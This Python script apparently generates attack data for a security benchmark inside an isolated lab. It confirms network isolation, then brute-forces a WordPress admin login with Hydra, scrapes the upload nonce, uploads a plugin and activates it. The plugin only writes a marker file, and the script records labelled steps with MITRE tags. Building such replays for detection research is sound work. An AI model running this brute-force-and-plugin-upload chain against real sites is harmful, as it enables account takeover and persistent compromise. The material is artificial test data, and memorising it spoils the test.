"""Exercise WordPress login guessing followed by an admin plugin upload."""

from __future__ import annotations

import argparse
import html
import html.parser
import json
import os
import re
import socket
import subprocess
import sys
import tempfile
import time
from datetime import UTC, datetime
from pathlib import Path
from urllib.parse import unquote, urljoin

import requests

sys.path.insert(0, "/opt/v2")

EDGE = "http://edge"
ATTACKER_IP = "192.0.2.131"
ADMIN_USER = os.environ["BENCH_ADMIN_USER"]
ADMIN_PASSWORD = os.environ["BENCH_ADMIN_PASSWORD"]
MARKER_PATH = "/wp-content/uploads/m8v2-s07-marker.txt"
PLUGIN_PATH = "m8v2-maintenance/m8v2-maintenance.php"


def timestamp() -> str:
    return datetime.now(UTC).isoformat(timespec="microseconds")


def isolate() -> None:
    from background import target_url

    try:
        target_url("/", "outside-lab")
    except ValueError:
        print("non_allowlisted_service_refused=PASS")
    else:
        raise SystemExit("non_allowlisted_service_refused=FAIL")
    try:
        with socket.create_connection(("1.1.1.1", 443), timeout=2):
            raise SystemExit("external_address_unreachable=FAIL")
    except OSError:
        print("external_address_unreachable=PASS")


class ActivationLinkParser(html.parser.HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.links: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag != "a":
            return
        values = dict(attrs)
        href = values.get("href") or ""
        if "action=activate" in href and PLUGIN_PATH in unquote(href):
            self.links.append(href)


def perform_attack() -> None:
    ready = Path("/replay/background-halfway")
    continuation = Path("/replay/background-continue")
    for _ in range(2400):
        if ready.exists():
            break
        time.sleep(0.05)
    else:
        raise TimeoutError("background replay did not reach its seeded attack point")

    records: dict[str, object] = {
        "scenario_id": "s07",
        "description": (
            "An attacker guesses the WordPress administrator password, signs in, and "
            "uploads a small plugin that leaves a text marker when activated."
        ),
        "attacker_ips": [ATTACKER_IP],
        "root_cause_step": "plugin_upload",
        "steps": [],
        "files": [
            {"path": f"/wp-content/plugins/{PLUGIN_PATH}", "role": "malicious_plugin"},
            {"path": MARKER_PATH, "role": "plugin_marker"},
        ],
        "analysis": {
            "access_logs": ["access.log.gz"],
            "error_logs": ["app-error.log"],
            "error_log_format": "apache",
            "error_log_utc_offset": "+0000",
            "manifest": "manifest.tsv",
            "baseline": "baseline.tsv",
            "trusted_proxies": [],
        },
        "split": "dev",
        "expected_rule_ids": [],
    }
    steps: list[dict[str, object]] = []
    for step_id, path in (
        ("site_check", "/"),
        ("login_page_probe", "/wp-login.php"),
        ("admin_area_probe", "/wp-admin/"),
        ("plugin_upload_probe", "/wp-admin/plugin-install.php?tab=upload"),
    ):
        requests.get(
            f"{EDGE}{path}",
            headers={"X-Lab-Step": step_id},
            timeout=10,
            allow_redirects=False,
        )
        steps.append(
            {
                "id": step_id,
                "category": "reconnaissance",
                "mitre": ["T1595"],
                "label_method": "header",
                "expected_in_timeline": False,
            }
        )

    with tempfile.TemporaryDirectory(prefix="s07-wordlist-") as temporary:
        wordlist = Path(temporary) / "passwords.txt"
        wordlist.write_text(
            "incorrect-candidate-one\nincorrect-candidate-two\n"
            "incorrect-candidate-three\n" + ADMIN_PASSWORD + "\n",
            encoding="utf-8",
        )
        hydra_started = timestamp()
        result = subprocess.run(
            [
                "hydra",
                "-I",
                "-f",
                "-t",
                "1",
                "-l",
                ADMIN_USER,
                "-P",
                str(wordlist),
                "-s",
                "80",
                "edge",
                "http-post-form",
                "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:F=incorrect",
            ],
            check=False,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=45,
        )
        hydra_ended = timestamp()
        safe_output = [
            re.sub(r"(password:\s*).*$", r"\1<redacted>", line, flags=re.IGNORECASE)
            for line in result.stdout.splitlines()
        ]
        Path("/replay/hydra-diagnostic.txt").write_text(
            "\n".join(safe_output[-24:]) + "\n", encoding="utf-8"
        )
        valid_login = any(
            "[80][http-post-form] host: edge" in line
            and f"login: {ADMIN_USER}" in line
            for line in result.stdout.splitlines()
        )
        if result.returncode != 0 or not valid_login:
            raise RuntimeError(
                f"pinned Hydra did not confirm the test administrator login; "
                f"returncode={result.returncode}; output={safe_output[-8:]}"
            )
        Path("/replay/hydra-result.json").write_text(
            json.dumps(
                {
                    "tool": "Hydra",
                    "source_commit": "a247d063e35f24218f55cc3c705e20073d1379eb",
                    "returncode": result.returncode,
                    "candidate_passwords": 4,
                    "valid_login_confirmed": True,
                },
                indent=2,
            )
            + "\n",
            encoding="utf-8",
        )
    steps.append(
        {
            "id": "hydra_valid_login",
            "category": "brute_force_success",
            "mitre": ["T1110.001"],
            "label_method": "attacker_ip_time_window",
            "attacker_ip": ATTACKER_IP,
            "started_at": hydra_started,
            "ended_at": hydra_ended,
            "request": "POST /wp-login.php HTTP/1.0",
            "status": 302,
        }
    )

    session = requests.Session()
    login_page = session.get(
        f"{EDGE}/wp-login.php",
        headers={"X-Lab-Step": "login_form"},
        timeout=15,
    )
    if login_page.status_code != 200:
        raise RuntimeError(f"WordPress login form returned HTTP {login_page.status_code}")
    steps.append(
        {
            "id": "login_form",
            "category": "valid_account_access",
            "mitre": ["T1078.003"],
            "label_method": "header",
        }
    )
    login = session.post(
        f"{EDGE}/wp-login.php",
        data={
            "log": ADMIN_USER,
            "pwd": ADMIN_PASSWORD,
            "wp-submit": "Log In",
            "redirect_to": f"{EDGE}/wp-admin/",
            "testcookie": "1",
        },
        headers={"X-Lab-Step": "editor_login"},
        timeout=15,
        allow_redirects=False,
    )
    if login.status_code != 302 or not any(
        "wordpress_logged_in" in cookie.name for cookie in session.cookies
    ):
        raise RuntimeError(f"administrator login was not accepted (HTTP {login.status_code})")
    steps.append(
        {
            "id": "editor_login",
            "category": "valid_account_access",
            "mitre": ["T1078.003"],
            "label_method": "header",
        }
    )

    upload_page = session.get(
        f"{EDGE}/wp-admin/plugin-install.php?tab=upload",
        headers={"X-Lab-Step": "plugin_upload_form"},
        timeout=15,
    )
    if upload_page.status_code != 200:
        raise RuntimeError(f"plugin upload form returned HTTP {upload_page.status_code}")
    nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', upload_page.text)
    if nonce_match is None:
        raise RuntimeError("WordPress plugin upload form did not contain its nonce")
    steps.append(
        {
            "id": "plugin_upload_form",
            "category": "valid_account_access",
            "mitre": ["T1078.003"],
            "label_method": "header",
        }
    )

    with tempfile.TemporaryDirectory(prefix="s07-plugin-") as temporary:
        import zipfile

        package = Path(temporary) / "m8v2-maintenance.zip"
        plugin = (
            "<?php\n"
            "/*\nPlugin Name: M8 v2 S07 marker plugin\nVersion: 1.0\n*/\n"
            "register_activation_hook(__FILE__, function () {\n"
            "    file_put_contents(\n"
            "        ABSPATH . 'wp-content/uploads/m8v2-s07-marker.txt',\n"
            "        'S07 marker recorded'\n"
            "    );\n"
            "});\n"
        )
        with zipfile.ZipFile(package, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(PLUGIN_PATH, plugin)
        upload = session.post(
            f"{EDGE}/wp-admin/update.php?action=upload-plugin",
            data={"_wpnonce": nonce_match.group(1), "install-plugin-submit": "Install Now"},
            files={"pluginzip": (package.name, package.open("rb"), "application/zip")},
            headers={"X-Lab-Step": "plugin_upload"},
            timeout=30,
            allow_redirects=False,
        )
        if upload.status_code != 200 or not any(
            phrase in upload.text
            for phrase in ("Plugin installed successfully", "Activate Plugin")
        ):
            visible_text = re.sub(r"<[^>]*>", " ", upload.text)
            visible_text = " ".join(html.unescape(visible_text).split())[:5000]
            Path("/replay/plugin-upload-diagnostic.txt").write_text(
                visible_text + "\n", encoding="utf-8"
            )
            raise RuntimeError(
                f"plugin ZIP upload did not complete (HTTP {upload.status_code}); "
                f"page={visible_text}"
            )
    steps.append(
        {
            "id": "plugin_upload",
            "category": "malicious_plugin_upload",
            "mitre": ["T1505.003"],
            "label_method": "header",
        }
    )

    plugins = session.get(f"{EDGE}/wp-admin/plugins.php", timeout=15)
    parser = ActivationLinkParser()
    parser.feed(plugins.text)
    if plugins.status_code != 200 or len(parser.links) != 1:
        raise RuntimeError("WordPress did not offer one activation link for the uploaded plugin")
    activation = session.get(
        urljoin(f"{EDGE}/wp-admin/", parser.links[0]),
        headers={"X-Lab-Step": "plugin_activation"},
        timeout=15,
        allow_redirects=False,
    )
    if activation.status_code != 302:
        raise RuntimeError(f"plugin activation returned HTTP {activation.status_code}")
    steps.append(
        {
            "id": "plugin_activation",
            "category": "persistence_activation",
            "mitre": ["T1505.003"],
            "label_method": "header",
        }
    )
    marker = session.get(
        f"{EDGE}{MARKER_PATH}",
        headers={"X-Lab-Step": "marker_check"},
        timeout=15,
    )
    if marker.status_code != 200 or marker.text.strip() != "S07 marker recorded":
        raise RuntimeError("plugin activation marker was not written and served")
    steps.append(
        {
            "id": "marker_check",
            "category": "post_compromise_check",
            "mitre": ["T1105"],
            "label_method": "header",
        }
    )

    continuation.write_text("continue\n", encoding="ascii")
    records["steps"] = steps
    Path("/replay/records.json").write_text(
        json.dumps(records, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    print(json.dumps({"attack_completed": True, "steps": len(steps)}, sort_keys=True))


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("action", choices=("isolation", "attack"))
    args = parser.parse_args()
    if args.action == "isolation":
        isolate()
    else:
        perform_attack()


if __name__ == "__main__":
    main()
